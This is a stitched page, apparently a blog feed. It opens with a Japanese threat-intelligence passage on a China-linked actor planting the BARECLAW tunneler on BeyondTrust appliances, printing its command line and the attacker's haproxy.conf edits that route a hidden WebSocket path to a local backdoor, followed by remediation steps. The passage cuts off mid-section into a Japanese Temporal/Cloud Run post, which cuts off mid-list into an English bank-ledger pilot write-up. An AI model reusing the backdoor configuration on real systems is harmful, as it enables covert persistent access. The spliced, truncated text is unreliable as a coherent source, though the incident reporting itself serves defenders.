<p><span style="color: #5f6368; display: block; font-size: 16px; margin-top: 8px; width: 100%;"><span style="vertical-align: baseline;">脅威アクターは、次のコマンドライン引数を使用して BARECLAW を実行しました。</span></span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>/tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge
</code></pre>
<p style="text-align: center;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"><span style="vertical-align: baseline;"><span style="font-style: italic; vertical-align: baseline;">図 9: BARECLAW の全コマンドライン引数</span></span></span></p></div>
<div class="block-paragraph_advanced"><p><span style="vertical-align: baseline;">このコマンドラインは、TCP ポート 19800 でリッスンし、被害者のシステムに WebSocket エンドポイント </span><code style="vertical-align: baseline;">/uidchanarge</code><span style="vertical-align: baseline;"> を作成するよう BARECLAW を構成しています。また、コマンドライン引数で指定するトークンを認証に使用することをクライアントに求め、-q 引数でトンネラーのロギングを抑制しています。トンネリングされたデータは、そのトークンと、セッションの開始時にクライアントから提供された 8 バイトの値から導出された XOR ベースのルーチンで暗号化されます。CLI オプションに --ssl-cert と --listen-tls の引数がないということは、この特定のインスタンスで TLS が有効になっていなかったことを意味します。</span></p>
<p><strong style="font-style: italic; vertical-align: baseline;">Haproxy.conf の変更</strong></p>
<p><span style="vertical-align: baseline;">Mandiant は、脅威アクターが BARECLAW トンネラーを作成しただけでなく、BARECLAW にインターネットから直接アクセスできるように </span><code style="vertical-align: baseline;">/ns/config/haproxy.conf</code><span style="vertical-align: baseline;"> ファイルを変更したことも確認しました。BeyondTrust デバイスで動作する HAProxy サービスは、デバイスのリバース プロキシとして機能し、BeyondTrust サーバーに代わって受信リクエストを受け入れ、リクエストのポートまたは URL パスに基づいて、ローカル システムで実行されている適切なバックエンド サービス（ウェブ インターフェース、管理ポータル、アプリケーション ゲートウェイなど）にリクエストを転送するものです。</span></p>
<p><code style="vertical-align: baseline;">haproxy.conf</code><span style="vertical-align: baseline;"> ファイルは、BeyondTrust アプライアンスが受信トラフィックを処理、ルーティング、保護する方法を指示する、主要な構成ファイルです。脅威アクターが変更した内容として、まず、特定の URI パス </span><code style="vertical-align: baseline;">/uidchanarge</code><span style="vertical-align: baseline;"> への受信トラフィックをモニタリングする、</span><code style="vertical-align: baseline;">wswsws</code><span style="vertical-align: baseline;"> という名前のアクセス制御リスト（ACL）が確立されました。このパスに一致するリクエストが検出されると、HAProxy は通常のアプライアンス ウェブサービスをバイパスし、</span><code style="vertical-align: baseline;">webskd3</code><span style="vertical-align: baseline;"> というカスタム バックエンドにトラフィックをルーティングします。</span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>    acl wswsws path /uidchanarge
    use_backend webskd3 if wswsws
</code></pre>
<p style="text-align: center;"><span style="vertical-align: baseline;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"><span style="font-style: italic; vertical-align: baseline;">図 10: haproxy.conf における ACL の変更</span></span></span></p></div>
<div class="block-paragraph_advanced"><p><span style="vertical-align: baseline;">次に、</span><code style="vertical-align: baseline;">webskd3</code><span style="vertical-align: baseline;"> バックエンドが、受信したウェブ ストリームをローカル（127.0.0.1 / localhost）で TCP ポート 19800 にルーティングします。このポートでは、BARECLAW ユーティリティがアクティブにリッスンしています。このローカル専用バインディングにより、バックドア リスナーは HAProxy のローカル リダイレクトを介して内部からのみアクセスできるため、外部ネットワーク スキャンから完全に隠蔽されます。</span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>backend webskd3
    mode http
    server websocks5srv 127.0.0.1:19800
    option http-keep-alive
    timeout server 28s
    timeout tunnel 5h
</code></pre>
<p style="text-align: center;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"><span style="vertical-align: baseline;"><span style="font-style: italic; vertical-align: baseline;">図 11: haproxy.conf におけるバックエンド ルートの変更</span></span></span></p></div>
<div class="block-paragraph_advanced"><p><strong style="vertical-align: baseline;">アトリビューション</strong></p>
<p><span style="vertical-align: baseline;">GTIG は、CVE-2026-102764 のゼロデイ攻撃と、それに続く SAWFLY および BARECLAW のデプロイを、中国との関連が疑われるサイバースパイ アクター ARMORY CASTLE（以前は UNC5221 として追跡）によるものと特定しています。この侵入で使用されたツールと TTP は、以前に確認された ARMORY CASTLE の活動と一致しています。</span></p>
<p><span style="vertical-align: baseline;">GTIG は以前、ARMORY CASTLE がエッジ アプライアンスの複数の脆弱性を悪用し、パッシブ バックドアやウェブシェルからエッジデバイスのトロイの木馬化されたコンポーネントまで、目的をサポートする広範なカスタムツールのスイートをデプロイしていることを</span><a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability?e=0"><span style="text-decoration: underline; vertical-align: baseline;">報告</span></a><span style="vertical-align: baseline;">しました。ARMORY CASTLE は 2023 年 10 月から活動しており、これまでにさまざまな国や業種を標的にしてきました。</span></p>
<p><strong style="vertical-align: baseline;">見通しと影響</strong></p>
<p><span style="vertical-align: baseline;">ARMORY CASTLE は、過去のキャンペーンで、ゼロデイとして選択的に悪用していた脆弱性が公表された後、それを広範囲にわたって日和見的に悪用し、パッチが適用される前に標的組織に侵入しようとしました。そのため、CVE-2026-102764 に関しても、同様の広範な悪用の試みが確認される可能性があります。</span></p>
<p><span style="vertical-align: baseline;">GTIG は、ARMORY CASTLE がサイバースパイの目的を達成するために、今後もエッジデバイスのゼロデイ脆弱性を利用して環境へのアクセスを獲得し続けると高い確信を持って評価しています。防御側は、CVE-2026-102764 の公表後にも、2024 年の CVE-2023-46805 と CVE-2024-21887 の公表後に GTIG が</span><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day"><span style="text-decoration: underline; vertical-align: baseline;">確認</span></a><span style="vertical-align: baseline;">したものと同様の広範な悪用を ARMORY CASTLE が行う可能性に備える必要があります。</span></p>
<p><strong style="vertical-align: baseline;">修復とセキュリティ強化</strong></p>
<p><a href="https://www.beyondtrust.com/trust-center/security-advisories/bt26-05" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">BT26-05 パッチ</span></a><span style="vertical-align: baseline;">をまだ適用していない組織は、直ちに影響とリスクを評価し、BeyondTrust の</span><a href="https://www.beyondtrust.com/blog/entry/bt26-05" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">ブログ</span></a><span style="vertical-align: baseline;">に記載されている追加のガイダンスを確認する必要があります。CVE-2026-102764 は、サポートされているすべての Remote Support バージョン（26.2.3 まで）に影響します。認証されていないリモート攻撃者がアプライアンス上でファイル操作を実行できるため、ホストレベルの制御や、アプライアンスが保存または仲介するすべての認証情報へのアクセスにつながる可能性があります。脆弱性のあるバージョンで、悪用が可能な期間中にインターネットからアクセス可能だったアプライアンスは、確認が完了するまで、侵害された可能性があるものとして扱う必要があります。Mandiant は、封じ込めとサポート対応の中断のバランスを取りながら、パッチ適用を優先する段階的なアプローチを推奨しています。</span></p>
<p><strong style="vertical-align: baseline;">即時の緩和</strong></p>
<p><span style="vertical-align: baseline;">組織は、リスク許容度、侵害の証拠、運用上のニーズに基づいて、次のオプションから選択する必要があります。</span></p>
<p><strong style="font-style: italic; vertical-align: baseline;">オプション 1: BT26-05 パッチを適用する（Mandiant 推奨）</strong></p>
<ul>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Remote Support SaaS</strong><span style="vertical-align: baseline;">: 2026 年 10 月 9 日に、BeyondTrust がすべての SaaS テナントにパッチを適用済みです。アプライアンス自体について、お客様による対応は必要ありません。ただし、オプション 3 の認証情報と構成の手順は依然必要です。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">セルフホスト型、バージョン 24.3.1 以降</strong><span style="vertical-align: baseline;">: </span><code style="vertical-align: baseline;">/appliance</code><span style="vertical-align: baseline;"> インターフェースから BT26-05-RS パッチを適用するか、アプライアンスが自動更新に登録されている場合は、パッチが自動的に適用されたことを確認します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">セルフホスト型、24.3.1 より前のバージョン</strong><span style="vertical-align: baseline;">: サポート対象のバージョンにアップグレードしてから、パッチを適用します。アップグレードすると脆弱性は解消されますが、それ以前に受けた影響は修復されません。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><code style="vertical-align: baseline;">/appliance</code><span style="vertical-align: baseline;"> にパッチが表示されない場合は、BT26-05 を指定して BeyondTrust サポートにケースを登録してください。</span></p>
</li>
</ul>
<p><strong style="font-style: italic; vertical-align: baseline;">オプション 2: 侵害された、または侵害が疑われるアプライアンスを隔離する</strong></p>
<ul>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">対応前に保存する</strong><span style="vertical-align: baseline;">: 変更や再起動を行う前に、メモリを含む仮想アプライアンスのスナップショットを作成し、ディスクをエクスポートします。B シリーズのハードウェアと SaaS テナントの場合は、BeyondTrust サポートを通じてフォレンジック保存をリクエストしてください。ホストにアクセスできる攻撃者はアプライアンス上のログを削除できるため、脆弱性がインターネットに露出していた期間中の syslog、リバース プロキシまたは WAF、境界ファイアウォールのログを収集します。Mandiant は、アクターがインシデント期間中のログを削除していたことを確認しています。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">境界で隔離する</strong><span style="vertical-align: baseline;">: アプライアンスのパブリック アドレスへのインバウンド トラフィックは、</span><code style="vertical-align: baseline;">/appliance</code><span style="vertical-align: baseline;"> ではなくファイアウォールでブロックします。これにより、構成はそのまま残り、後で確認できます。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">外向きトラフィックを制限する</strong><span style="vertical-align: baseline;">: BeyondTrust のアップデートとライセンスのエンドポイントへのトラフィックを除き、アウトバウンド トラフィックを拒否し、拒否されたすべての接続をログに記録します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">アクセスパスを終了する</strong><span style="vertical-align: baseline;">: </span><code style="vertical-align: baseline;">/login</code><span style="vertical-align: baseline;"> から、アクティブなサポート セッションを終了し、新しいセッション、Jump Client、Jumpoint、API アカウントを無効にします。削除ではなく無効化することで、監査証跡が残ります。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">クリーンアップではなく再構築する</strong><span style="vertical-align: baseline;">: 侵害が確認された、または侵害ステータスが不明なアプライアンスを、完全にパッチが適用されたクリーンなイメージから再デプロイします。お客様はアプライアンスのホスト ファイル システムを監査できません。また、ホストレベルの永続性は再起動や構成のリセット後も維持されます。露出期間より前の日付の構成バックアップのみを復元するか、隔離された状態で最新のバックアップを復元し、オプション 3、パート B の確認を完了してから、再接続します。新しい TLS 証明書を発行し、再構築したアプライアンスから Jump Client、Jumpoint、担当者向けコンソールを再デプロイします。</span></p>
</li>
</ul>
<p><strong style="vertical-align: baseline;">注</strong><span style="vertical-align: baseline;">: 隔離やセッションの終了を行うと、サポート対応が中断されます。組織は、続行する前にヘルプデスクやベンダー サポートの関係者と調整を行う必要があります。</span></p>
<p><strong style="font-style: italic; vertical-align: baseline;">オプション 3: ターゲットを絞った補完的な制御を適用する</strong></p>
<p><span style="vertical-align: baseline;">以下の制御により、露出を減らし、侵害後の影響を制限できます。これらはパッチの代わりにはなりません。</span></p>
<p><strong style="vertical-align: baseline;">パート A: ネットワークの制限</strong></p>
<ul>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">アプライアンス レベルで、IP またはネットワーク セグメントによって管理インターフェース </span><code style="vertical-align: baseline;">/login</code><span style="vertical-align: baseline;"> と </span><code style="vertical-align: baseline;">/appliance</code><span style="vertical-align: baseline;"> へのアクセスを制限します。インターネットからアクセスできるのは、担当者向けコンソール、カスタマー ポータル、Jump Client のトラフィックのみにする必要があります。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">運用上可能な場合は、アプライアンスの前に完全な URI ロギングを備えたリバース プロキシまたは WAF を配置して、アプライアンスが変更できないリクエストパスの記録をとります。</span></p>
</li>
</ul>
<p><strong style="vertical-align: baseline;">パート B: 認証情報のローテーションと構成の確認</strong></p>
<ul>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">セッションと登録を取り消す</strong><span style="vertical-align: baseline;">: すべてのアクティブなサポート セッションを終了し、パッチ適用済みまたは再構築済みのアプライアンスから Jump Client、Jumpoint、担当者向けコンソールを再デプロイして、既存のトークンを無効にします。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">依存関係の順に認証情報をローテーションする</strong><span style="vertical-align: baseline;">: </span><code style="vertical-align: baseline;">/appliance</code><span style="vertical-align: baseline;"> 管理者の認証情報、/login 管理者とローカル ユーザー、API クライアント シークレット、セキュリティ プロバイダのバインド アカウントと SAML 署名鍵、Remote Support Vault と統合された Password Safe または Privileged Remote Access（PRA）認証情報（ターゲット システムでローテーション）、統合認証情報（SMTP、syslog、情報技術サービス管理（ITSM）コネクタ、アウトバウンド イベントのシークレット）、期間中にサポート セッションに入力された認証情報。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">/login 構成を対象期間前のベースラインに照らして確認する</strong><span style="vertical-align: baseline;">: ユーザーとロールの変更、特に管理者権限に昇格された Jump Item ロール、グループとセッションのポリシー、API アカウント、セキュリティ プロバイダ、Jump Item と Jumpoint、アウトバウンド イベントまたは syslog の宛先。変更記録や所有者名のないものはすべて削除します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">サポート セッションのレポートを確認する:</strong><span style="vertical-align: baseline;"> ファイル転送を含む期間中のレポートを確認し、どのエンドポイントにアクセスされ、何が残されたかを特定します。アクセスされたすべてのエンドポイントが、ダウンストリーム ハンティングの対象となります。</span></p>
</li>
</ul>
<p><strong style="vertical-align: baseline;">注</strong><span style="vertical-align: baseline;">: 認証情報のローテーションは、アプライアンスのパッチ適用か再構築の後で行ってください。それより前にローテーションを行うと、新しい認証情報が、アプライアンスをまだ制御している攻撃者に開示されます。</span></p>
<p><strong style="vertical-align: baseline;">パート C: コントロール プレーンの制限</strong></p>
<ul>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">すべての </span><code style="vertical-align: baseline;">/login</code><span style="vertical-align: baseline;"> ユーザーに、フィッシング耐性のある MFA を使用した SAML シングル サインオンを必須とします。また、ローカル アカウントは、Vault に保存され、使用時にアラートが発生する、ブレークグラス アカウント 1 つを除いて削除します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">組み込みの管理者アカウントについては、公式の</span><a href="https://docs.beyondtrust.com/rs/docs/two-factor-authentication#activate-two-factor-authentication" rel="noopener" target="_blank"><span style="vertical-align: baseline;"> </span><span style="text-decoration: underline; vertical-align: baseline;">BeyondTrust 2 要素認証ガイドライン</span></a><span style="vertical-align: baseline;">に沿って多要素認証（MFA）が構成されていることを確認します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">すべてのグループ ポリシーで、Jump Item のデフォルトのロールを「No Access」（アクセスなし）に設定し、ユーザーごとではなくポリシーを通じてロールを付与します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">API アカウントのスコープを最小限の権限セットに設定し、ユーザーまたは Jump Item の管理権限を持つアカウントには自動化の所有者を指名します。また、API シークレットはスケジュールに沿ってローテーションします。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">特権認証情報は、Remote Support Vault ではなく、認証情報インジェクションを使用する Password Safe または外部 Vault に保管します。アプライアンスには、非対話型サービス アカウントの認証情報のみを保存します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">アプライアンスからのアウトバウンド トラフィックにデフォルト拒否のフィルタリングを適用し、BeyondTrust のエンドポイントおよび組織独自の syslog サーバーとディレクトリ サーバーのみを許可します。</span></p>

<p><strong style="vertical-align: baseline;">パート D: ロギングと検出エンジニアリング</strong></p>

### Cloud Run 上の Temporal Serverless Workers: 需要の変動を見越してワーカーをスケーリング

- **Link**: [https://cloud.google.com/blog/ja/products/serverless/temporal-serverless-workers-on-cloud-run-worker-pools/](https://cloud.google.com/blog/ja/products/serverless/temporal-serverless-workers-on-cloud-run-worker-pools/)
- **Published**: 2026-10-27 11:10:00
- **Fetched**: 2026-10-27 22:59:10

<details class="entry-summary">
<summary>詳細を表示</summary>
<div class="block-paragraph_advanced"><p><span style="vertical-align: baseline;">※この投稿は米国時間 2026 年 10 月 16 日に、Google Cloud blog に</span><a href="https://cloud.google.com/blog/products/serverless/temporal-serverless-workers-on-cloud-run-worker-pools?e=48754805&amp;hl=en"><span style="text-decoration: underline; vertical-align: baseline;">投稿</span></a><span style="vertical-align: baseline;">されたものの抄訳です。</span></p>
<p><span style="vertical-align: baseline;">オープンソースの</span><a href="https://temporal.io/" rel="noopener" target="_blank"><span style="vertical-align: baseline;"> </span><span style="text-decoration: underline; vertical-align: baseline;">Temporal</span></a><span style="vertical-align: baseline;"> 実行プラットフォームは、現代のソフトウェア インフラストラクチャにおける基盤レイヤとして急速に普及しており、特に分散システムや AI エージェント ワークロードのオーケストレーションで真価を発揮しています。しかし、Temporal でワーカーのデプロイやスケーリングを行うには、特有の課題が伴います。ワーカーはリクエストの処理ではなくタスクのポーリングを行うため、リクエスト ドリブンなサーバーレス プラットフォームには適していません。その結果、Kubernetes や VM 上でワーカー フリートを運用せざるを得なくなり、継続的な管理の手間と費用が発生します。指標パイプラインを構築し、自動スケーリングのトリガーをチューニングしても、指標の反映遅延によってスケーリングが急激な負荷に追いつかないことがあります。デプロイごとにアップグレードやバージョンの複雑な管理に追われ、タスクがキューにない状態でもコンピューティング料金を払い続けなければなりません。</span></p>
<p><span style="vertical-align: baseline;">Google は、まさにこのような pull ベースのタスクのために </span><a href="https://docs.cloud.google.com/run/docs/deploy-worker-pools"><span style="text-decoration: underline; vertical-align: baseline;">Cloud Run ワーカープール</span></a><span style="vertical-align: baseline;">を開発しました。インスタンスがキューやストリームに接続し、次のアイテムを取り出して処理します。このたび、Temporal のオープンソース プラットフォームのフルマネージド版である </span><a href="https://temporal.io/cloud" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">Temporal Cloud</span></a><span style="vertical-align: baseline;"> が、これらのワーカープールを自動スケーリングできるようになりました。現在プレビュー版として提供されている Cloud Run 上の </span><a href="https://docs.temporal.io/serverless-workers" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">Temporal Serverless Workers</span></a><span style="vertical-align: baseline;"> を使用すると、ワーカーをワーカープールとしてデプロイできます。Temporal は、タスクキューの作業量に合わせてプールのサイズを自動調整します。タスクがない場合は、プールをゼロにスケールダウンできます。運用すべきクラスタやオートスケーラーは不要で、既存のワーカーコードもそのまま利用できます。</span></p>
<h4><strong style="vertical-align: baseline;">Cloud Run ワーカープールと Temporal の連携の仕組み</strong></h4>
<p><span style="vertical-align: baseline;">ワーカープールは、継続的なバックグラウンド タスクを実行するための Cloud Run リソースです。パブリック エンドポイントを持たず、各インスタンスのライフサイクル全体にわたって CPU が常時割り当てられます。これは Temporal ワーカーの実行モデルと一致しています。Temporal は、Cloud Run ワーカープールを次のように管理します。</span></p>
<ol>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">Temporal ワーカーは、プロジェクト内で Cloud Run ワーカープールのインスタンスとして実行され、Temporal Cloud をポーリングしてタスクを取得します。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">Temporal Cloud は、付与された IAM 権限を使用してタスクキューの状況をトラッキングし、Cloud Run Admin API 経由でワーカープールのインスタンス数を設定します。Temporal がインスタンスへの接続を開くことはないため、ポートを開いたり、ファイアウォール ルールを追加したりする必要はありません。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">ビルドのバージョンごとに、それぞれ独立した Cloud Run ワーカープールとして実行します。古いビルドのワーカープールは、そのビルドで開始されたワークフローで再び処理が必要になるまで、インスタンス数をゼロの状態で待機させることができます。</span></p>
</li>
</ol>
<p><span style="vertical-align: baseline;">Temporal ワーカーは、ご自身のプロジェクト内、サービス アカウント、ネットワーク上で実行されます。Temporal が、その実行数を判断します。</span></p>
<h4><strong style="vertical-align: baseline;">Temporal Serverless Workers の活用例</strong></h4>
<p><span style="vertical-align: baseline;">Cloud Run ワーカープールと Temporal Serverless Workers を組み合わせることで、以下のようなさまざまなユースケースが実現します。</span></p>
<p><strong style="vertical-align: baseline;">自動スケーリングするエージェント ワーカー:</strong><span style="vertical-align: baseline;"> AI エージェントが、LLM の推論とツール呼び出しのマルチステップ チェーンを実行します。ここでは、Temporal の耐久性に優れた実行機能と Cloud Run ワーカープールが効果的に連携します。Temporal ワーカーは即座にスピンアップし、LLM の処理ステップ、エンベディング生成、API 呼び出しなどの急激な負荷を処理したあと、キューが空になると自動でゼロにスケールダウンします。ワーカーは Google Cloud AI API にキーレスでアクセスできます。推論用に GPU をアタッチすることも可能で、その場合でも GPU 付きのワーカーは問題なくゼロまでスケールダウンします。Temporal は、各モデルやツールの呼び出しを耐久性に優れたアクティビティとして実行します。ステップの途中でワーカーが消失した場合でも、アクティビティは別のワーカーで再試行され、ワークフローは継続されます。</span></p>
<p><strong style="vertical-align: baseline;">長時間実行されるワークフロー:</strong><a href="https://docs.temporal.io/workflows" rel="noopener" target="_blank"><span style="vertical-align: baseline;"> </span><span style="text-decoration: underline; vertical-align: baseline;">Temporal ワークフロー</span></a><span style="vertical-align: baseline;">は無制限に実行し続けることができるため、現実世界のリソース状態を長期間にわたってトラッキングするアプリケーションを構築できます。このパターンは、あるエンティティの状態をワークフローが表すことから、一般に「</span><a href="https://docs.temporal.io/design-patterns/entity-workflow%5C" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">エンティティ パターン</span></a><span style="vertical-align: baseline;">」と呼ばれます。しかし、こうした長時間実行されるワークフローでは、常に一定のコンピューティングが必要とされるわけではありません。個々のステップによって処理時間が短いものもあれば長いものもあり、時にはワークフロー自体がスリープして、人間や外部システムからの入力を待機している状態になることもあります。Cloud Run ワーカープールは、このパターンをサポートする柔軟なコンピューティング リソースを提供します。個々のステップは必要な時間だけ実行でき、処理すべきタスクがないときは、Temporal がワーカープールを自動的にスケールダウンします。</span></p>
<p><strong style="vertical-align: baseline;">バーストバッチ処理:</strong><span style="vertical-align: baseline;"> ワーカープールはインスタンスの実行中にのみ課金されるため、バッチ実行の合間にアイドル状態になっているワーカープールは、インスタンスがゼロの間は費用が発生しません。請求処理やメディアのコード変換といったジョブでは、バッチ処理の到着に合わせて Temporal がプールをスケールアウトし、キューが空になると自動でスケールインします。最大インスタンス数を設定することで、課金対象となるインスタンス数を制限できます。設定した上限を超えるタスクは、ドロップされるのではなく、キューで待機します。</span></p>
<h4><strong style="vertical-align: baseline;">Temporal ワーカーの実行基盤に Cloud Run ワーカープールを選ぶ理由</strong></h4>
<p><span style="vertical-align: baseline;">以前は、Cloud Run サービス上で Temporal ワーカーを実行するために、いくつかの回避策を講じる必要がありました。</span></p>
<ul>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">HTTP リスナーの実装（Cloud Run サービスは、コンテナが特定のポートでリクエストをリッスンすることを前提としているため）</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">インスタンス単位の課金への変更（リクエスト処理の合間もワーカーが CPU を保持し続けるようにするため）</span></p>
</li>
<li style="vertical-align: baseline;">
<p><span style="vertical-align: baseline;">最小インスタンス数の設定（Cloud Run サービスがゼロにスケールダウンしないようにするため）</span></p>
</li>
</ul>
<p><span style="vertical-align: baseline;">Cloud Run ワーカープール上で Temporal ワーカーを実行することで、これらの回避策は不要になり、次のようなメリットが得られます。</span></p>
<ul>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">エンドポイントの管理が不要。</strong><span style="vertical-align: baseline;">ロックダウンすべき公開 URL やロードバランサは存在せず、実装が必要なヘルスチェック ポートもありません。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">低料金で安定した CPU。</strong><span style="vertical-align: baseline;">インスタンスはアイドル状態にならず、スロットリングも行われません。Cloud Run はアイドル状態に見えるインスタンスを勝手に削除しないため、プールが縮小するタイミングは Temporal のみが決定します。ワーカープールの料金は、インスタンス課金型の Cloud Run サービスと比較して、vCPU 時間あたりおよび GB 時間あたりで約 40% 安く設定されています。</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">リビジョンのチャーンなしでスケーリング。</strong><span style="vertical-align: baseline;">インスタンス数を変更しても新しいリビジョンは作成されないため、Temporal は負荷の変化に応じて頻繁にプールのサイズを変更できます。</span></p>
</li>
</ul>
<h4><strong style="vertical-align: baseline;">Temporal によるワーカープールのスケーリングとバージョニングの仕組み</strong></h4>
<p><span style="vertical-align: baseline;">Temporal は、タスクがタスクキューのバックログに追加されてからワーカーに取得されるまでの遅延を主要な指標として、リソースを追加するタイミングを判断します。この遅延が大きくなっている場合は、利用可能なワーカーが飽和状態にあります。スケーリングは次のように行われます。</span></p>
<ul>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">サーバーサイドの検出:</strong><span style="vertical-align: baseline;"> Temporal サーバーは、タスクキューごとにバックログからワーカー取得までのレイテンシをトラッキングします。</span></p>
</li>
<li style="vertical-align: baseline;">

<div class="block-paragraph"><p>At the same time, participant banks connected their core banking systems to their own GCUL API instances. But these participant banks don’t need a large Google Cloud footprint. Instead, they can connect to GCUL nodes via Remote Procedure Call from their existing on-premise deployments and manage private key material through solutions other than KMS. Regardless of the setup, transactions are seamlessly routed to the shared global GCUL nodes.</p><p>Whether GCUL is exposed to a bank’s client or used merely as a bank backend is entirely at the integrating institution’s discretion. The banks participating in the pilot chose the latter, utilizing the ledger to upgrade their backend infrastructure. With GCUL under the hood, they improved intra-day transaction performance and provided customers with the user experience they were already accustomed to.</p><h3><b>Regulatory compliance and governance by design</b></h3><p>To join the Swiss Franc currency network on GCUL, participants must have regulatory licenses that let them perform third-party transfers and issue commercial bank money. Crucially, features like token and account management are not rigid network-wide limitations. Instead, they rely entirely on the currency operator and its specific rulebook. This standardizes fees, limits, settlement times, and technical configurations.</p><p>Managing counterparty risk is central to this governance. Rather than relying on unscalable bilateral agreements or complex clearinghouse default waterfalls, GCUL mitigates risk through these currency operator-enforced issuance limits.</p><p>It’s important to distinguish GCUL’s broader feature set from the concrete pilot setup. In the pilot, both participating banks operated with conservative initial limits based on their credit ratings in order to safely prove the architecture. But beyond the pilot, the network frees up capital by periodically netting outstanding obligations, which frees banks from having to fund and settle every transaction.</p><p>Looking ahead, risk management can be further innovated. One clever future enhancement would be to allow participants to dynamically increase their issuance limits by committing digital assets as collateral in segregated accounts, using solutions like Crypto Finance’s <a href="https://www.crypto-finance.com/anchornote/" target="_blank">AnchorNote</a> pledging solution. These assets could then be used to instantly settle outstanding street-side obligations, virtually eliminating counterparty risk without tying up traditional liquidity reserves.</p><h3><b>The future</b></h3><p>While Crypto Finance’s pilot was designed to focus on domestic commercial bank money transfers in Switzerland, GCUL's programmable architecture and high-performance smart contract language, GCULpy, are paving the way for deeper innovation. As institutions like Crypto Finance scale their use of GCUL, the network can expand to support real-time cross-currency settlement, automated foreign exchange, and dynamic collateral management involving tokenized digital assets. And looking further ahead, this infrastructure has laid the groundwork for next-generation financial services that range from point-of-sale payments to autonomous, AI-driven agentic payments.</p><p>The pilot proved that deploying high-performance, blockchain-based payment rails doesn’t mean compromising on strict regulatory compliance or core banking stability. By combining the high-throughput of GCUL with a secure, API-driven integration architecture, commercial banks can offer stablecoin-like speed to their customers while seamlessly preserving their capital efficiency. Ultimately, this compliant-by-design approach targets the operational bottlenecks of traditional finance while mitigating the inherent risks and complexities of public blockchains.</p><p>To learn how your institution can build on this blueprint to fundamentally upgrade your operational payments infrastructure, contact Google Cloud Sales to explore the Google Cloud Universal Ledger.</p><p><i>The team would also like to thank Phil Dettwiler, Andras Miklos, Ignazio Pollina, and Ozan Kizildogan at Crypto Finance and Googlers Chris Esch, Ishan Singh, Olena Clayton, and Stathis Onasoglou for their contributions.</i></p></div>
